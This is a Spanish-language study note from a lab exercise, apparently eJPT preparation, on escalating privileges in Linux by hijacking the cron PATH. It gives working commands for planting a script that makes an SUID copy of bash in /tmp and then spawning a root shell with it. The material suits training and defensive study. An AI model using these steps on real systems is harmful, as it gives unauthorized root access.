- Vea el contenido del crontab de todo el sistema:

```
cat /etc/crontab
```
Tenga en cuenta que la variable PATH comienza con /home/user, que es el directorio de inicio de nuestro usuario.

- Cree un archivo llamado overwrite.sh en su directorio de inicio con el siguiente contenido:
```
#!/bin/bash  
  
cp /bin/bash /tmp/rootbash  
chmod +xs /tmp/rootbash
```

- Asegúrese de que el archivo sea ejecutable:

```
chmod +x /home/user/overwrite.sh
```

- Espere a que se ejecute el trabajo cron (no debería tardar más de un minuto). Ejecute el comando /tmp/rootbash con -p para obtener un shell que se ejecute con privilegios de root:

```
/tmp/rootbash -p
```

Recuerde eliminar el código modificado, eliminar el ejecutable /tmp/rootbash y salir del shell elevado antes de continuar, ya que creará este archivo nuevamente más adelante en la sala.

```
rm /tmp/rootbash  
exit
```

enlace:
[[Local/Ciberseguridad/HACKING/CERTIFICACIONES/EJPT/Preparacion-Ejpt]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Linux/Cron Jobs - File Permissions]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Linux/Cron Jobs - Wildcards]]